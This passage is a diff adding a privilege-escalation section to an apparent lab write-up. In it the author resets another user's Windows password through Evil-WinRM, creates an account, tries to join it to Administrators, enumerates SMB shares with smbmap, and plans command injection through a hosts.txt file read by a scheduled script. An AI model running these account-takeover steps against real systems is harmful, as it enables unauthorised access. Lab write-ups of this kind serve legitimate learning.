@@ -479,4 +479,101 @@ so ... its time ...
 
 ## 4. Priv Esc
 
-For next time!
+Going way back, we see a directory named `scripts`. That looks odd. Let's check the files in it. One is `*.ps1`. ps1 can be expanded to `power shell 1`. This is parallel to `*.sh` files in linux, used to run bash scripts. This means ... there's juice :D
+
+(I am reading only through comments.)
+
+```
+# Read the File with the Hosts every cycle, this way to can add/remove hosts
+# from the list without touching the script/scheduled task,
+# also hash/comment (#) out any hosts that are going for maintenance or are down.
+get-content C:\Users\brittanycr\hosts.txt
+```
+
+Okay so we need to get into Brittany's account, and put code that we want in `hosts.txt`.
+
+Okay. We do not have the permissions to even read `/brittanycr`'s contents. But, I have 2 options:
+1. Remove the account if possible, and create a new one with the same name
+2. or, well, if you have the permissions to change password, just do that, and login as brittanycr.
+
+I treid googling how to, and came up with this: `*Evil-WinRM* PS C:\Users> net user <username> <password>`
+
+```
+*Evil-WinRM* PS C:\Users> net user brittanycr securepass
+net.exe : The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
+    + CategoryInfo          : NotSpecified: (The password do...y requirements.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+More help is available by typing NET HELPMSG 2245.
+```
+
+Trying it out, apparently we have to make the password stronger ... which means we can change it?
+
+You could do random guesses to figure the right one, but we have the answer already, as was with `lilyle`'s accounts ;)
+
+```
+*Evil-WinRM* PS C:\Users> net user brittanycr ChangeMe#1234
+The command completed successfully.
+```
+
+:stonks:
+
+```
+❯ evil-winrm -u brittanycr -p ChangeMe#1234 -i 10.10.16.138
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                                                              
+
+Error: Exiting with code 1
+```
+
+Okay this should have worked. But what else ... ? 
+
+Meanwhile, let's login as `buse`, and add ourselves to the network :D `net user <username> <password> /add`.
+
+```
+*Evil-WinRM* PS C:\Users\buse\Documents> net user tanishq ChangeMe#1234 /add
+The command completed successfully.
+```
+
+```
+*Evil-WinRM* PS C:\Users\buse\Documents> net localgroup Administrators tanishq /add
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+Access is denied.
+```
+
+Ah shet. We dont have enough permissions to add ourselves. 
+
+Let's try `smbmap` and `smbclient` for brittany instead.
+
+```
+❯ smbmap -u brittanycr -p ChangeMe#1234 -H 10.10.16.138
+[+] IP: 10.10.16.138:445        Name: 10.10.16.138                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Shared                                                  READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+
+```
+
+So the password has changed, and we can login! We get the `hosts.txt` file, finally. 
+```
+❯ cat hosts.txt
+google.com
+cisco.com
+```
+
+Now, add the commands, and put the file. Easy? my dumbass still can't figure that. 
+
+:(((
